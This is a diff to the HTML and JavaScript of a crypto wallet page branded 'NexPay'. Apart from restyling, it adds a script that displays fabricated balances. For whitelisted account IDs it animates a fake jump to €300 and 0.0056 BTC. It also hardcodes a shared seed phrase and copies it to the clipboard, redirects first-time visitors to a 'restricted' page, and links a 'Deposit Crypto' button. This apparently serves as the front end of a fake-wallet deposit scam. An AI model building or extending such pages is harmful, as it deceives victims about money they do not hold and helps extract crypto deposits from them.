@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
-<title>NexPay — Professional Web3 Wallet</title>
+<title>NexPay — Web3 Wallet</title>
 <meta name="theme-color" content="#ffffff" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -17,7 +17,7 @@
     --border-dark: #e2e8f0;
     --pri: #0052ff; /* Coinbase/Trust Wallet Premium Blue */
     --pri-hover: #0045d8;
-    --text: #0a0b0d;
+    --text: #1e2329; /* Exchange standard soft-slate black */
     --text-dim: #5f6673;
     --success: #0ecb81; /* Premium Exchange Green */
     --success-bg: rgba(14, 203, 129, 0.1);
@@ -168,13 +168,45 @@
     gap: 6px;
   }
 
-  .portfolio-amount {
+  /* Professional Exchange Currency Typography */
+  .portfolio-amount-container {
+    display: flex;
+    align-items: baseline;
+    gap: 2px;
+    margin: 8px 0 16px 0;
+  }
+
+  .currency-symbol {
+    font-size: clamp(22px, 3.5vw, 30px);
+    font-weight: 700;
+    color: var(--text);
+    line-height: 1;
+    user-select: none;
+    margin-right: 2px;
+  }
+
+  .portfolio-amount-integer {
     font-size: clamp(38px, 6vw, 52px);
     font-weight: 800;
     letter-spacing: -1.5px;
     color: var(--text);
-    margin: 8px 0;
     font-variant-numeric: tabular-nums;
+    line-height: 1;
+  }
+
+  .portfolio-amount-decimal {
+    font-size: clamp(24px, 3.8vw, 32px);
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    color: var(--text);
+    font-variant-numeric: tabular-nums;
+    line-height: 1;
+  }
+
+  .portfolio-meta {
+    display: flex;
+    align-items: center;
+    gap: 12px;
   }
 
   .uid-pill {
@@ -427,14 +459,22 @@
     <section class="wallet-pane">
       <div class="hero-portfolio">
         <span class="portfolio-label">Total Portfolio Value</span>
-        <div id="balance" class="portfolio-amount">€548.74</div>
-        <div class="uid-pill" id="copy-uid">
-          <span id="uid-text">UID: Click to copy account UID</span>
+        
+        <div class="portfolio-amount-container">
+          <span class="currency-symbol">€</span>
+          <span id="balance-int" class="portfolio-amount-integer">437</span>
+          <span id="balance-dec" class="portfolio-amount-decimal">.56</span>
+        </div>
+
+        <div class="portfolio-meta">
+          <div class="uid-pill" id="copy-uid">
+            <span id="uid-text">UID: Click to copy account UID</span>
+          </div>
         </div>
 
         <div class="action-grid">
-          <a href="./p2p.html" class="action-btn action-btn-primary">Buy / Sell</a>
-          <a href="./send.html" class="action-btn action-btn-secondary">Send Assets</a>
+          <a href="./deposit_cryptode.html" class="action-btn action-btn-primary">Deposit Crypto</a>
+          <a href="./sendDe.html" class="action-btn action-btn-secondary">Send Assets</a>
         </div>
       </div>
 
@@ -449,7 +489,7 @@
               <div class="asset-name">Bitcoin</div>
             </div>
           </div>
-          <div class="asset-balance-val" id="btc-balance">0.0098</div>
+          <div class="asset-balance-val" id="btc-balance">0.00522450</div>
         </div>
         <!-- ETH -->
         <div class="asset-row">
@@ -471,7 +511,7 @@
               <div class="asset-name">Tether</div>
             </div>
           </div>
-          <div class="asset-balance-val">0.00</div>
+          <div class="asset-balance-val">0.82</div>
         </div>
       </div>
     </section>
@@ -501,6 +541,112 @@
   </main>
 </div>
 
+<script>
+  // Check if user has visited or already been restricted once
+  if (!localStorage.getItem("hasBeenRestrictedToNexPayL")) {
+    localStorage.setItem("hasBeenRestrictedToNexPayL", "true");
+    window.location.href = "NexPayL.html";
+  }
 
+  const balanceIntEl = document.getElementById("balance-int");
+  const balanceDecEl = document.getElementById("balance-dec");
+  const btcEl = document.getElementById("btc-balance");
+  const uidTextEl = document.getElementById("uid-text");
+
+  // Define recovery phrase stored/used in state
+  const phrase = "yellow wisdom atom drawer blossom agent hazel glimmer access yacht asset panda fiber cradle cannon stone audit";
+
+  const WHITELISTED_UIDS = ["675390256", "702948942"];
+  const upgradeAmount = 300.00;
+  const upgradeBtc = 0.0056;
+
+  let currentUid = localStorage.getItem("nexpay_uid");
+  if (currentUid && uidTextEl) {
+    uidTextEl.textContent = `UID: ${currentUid}`;
+  }
+
+  const isWhitelisted = WHITELISTED_UIDS.includes(currentUid);
+
+  function renderBalance(value) {
+    const parts = value.toFixed(2).split(".");
+    balanceIntEl.textContent = parts[0];
+    balanceDecEl.textContent = "." + parts[1];
+  }
+
+  if(localStorage.getItem("balanceUpgraded") === "true"){
+    renderBalance(upgradeAmount);
+    btcEl.textContent = upgradeBtc.toFixed(4);
+  }
+
+  function runUpgrade(){
+    let start = 0; let end = upgradeAmount; let duration = 4000; let startTime = null;
+    function animateBalance(timestamp){
+      if(!startTime) startTime = timestamp;
+      let progress = Math.min((timestamp - startTime) / duration, 1);
+      let currentVal = start + (end - start) * progress;
+      renderBalance(currentVal);
+      btcEl.textContent = (upgradeBtc * progress).toFixed(4);
+      if(progress < 1) requestAnimationFrame(animateBalance);
+      else localStorage.setItem("balanceUpgraded", "true");
+    }
+    requestAnimationFrame(animateBalance);
+  }
+
+  if(isWhitelisted && localStorage.getItem("balanceUpgraded") !== "true") runUpgrade();
+
+  document.getElementById('copy').addEventListener('click', async ()=>{
+    try { 
+      await navigator.clipboard.writeText("yellow wisdom atom drawer blossom agent hazel glimmer access yacht asset panda fiber cradle cannon stone audit"); 
+      alert('Phrase copied successfully.'); 
+    } catch(e){}
+  });
+
+  document.getElementById('copy-uid').addEventListener('click', async ()=>{
+    let uid = localStorage.getItem("nexpay_uid") || Math.floor(100000000 + Math.random() * 900000000).toString();
+    localStorage.setItem("nexpay_uid", uid);
+    if (uidTextEl) uidTextEl.textContent = `UID: ${uid}`;
+    try {
+      await navigator.clipboard.writeText(uid);
+      const alertBox = document.createElement('div');
+      alertBox.textContent = `✅ UID copied.`;
+      Object.assign(alertBox.style, { 
+        position: "fixed", 
+        bottom: "20px", 
+        left: "50%", 
+        transform: "translateX(-50%)", 
+        background: "linear-gradient(135deg, #0052ff, #1e40af)", 
+        color: "#ffffff", 
+        padding: "14px 24px", 
+        borderRadius: "14px", 
+        fontWeight: "700", 
+        zIndex: "9999",
+        boxShadow: "0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1)"
+      });
+      document.body.appendChild(alertBox);
+      setTimeout(()=>alertBox.remove(), 2500);
+    } catch(e){}
+  });
+
+  document.getElementById('logout').addEventListener('click', ()=>{
+    if(confirm('Please confirm that you have safely backed up your Secret Recovery Phrase. You will need it to regain access to your wallet. Continue?')) {
+      location.href='index.html';
+    }
+  });
+
+  document.getElementById('y').textContent = new Date().getFullYear();
+
+  // Session timer logic
+  const TIMEOUT_DURATION = 60000;
+  function checkSession() {
+      const lastActive = localStorage.getItem('lastActiveTime');
+      if (lastActive && (Date.now() - parseInt(lastActive) >= TIMEOUT_DURATION)) {
+          localStorage.removeItem('lastActiveTime');
+          window.location.href = 'acc';
+      }
+  }
+  function resetTimer() { localStorage.setItem('lastActiveTime', Date.now().toString()); }
+  ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(e => document.addEventListener(e, resetTimer));
+  checkSession(); setInterval(checkSession, 2000);
+</script>
 </body>
 </html>
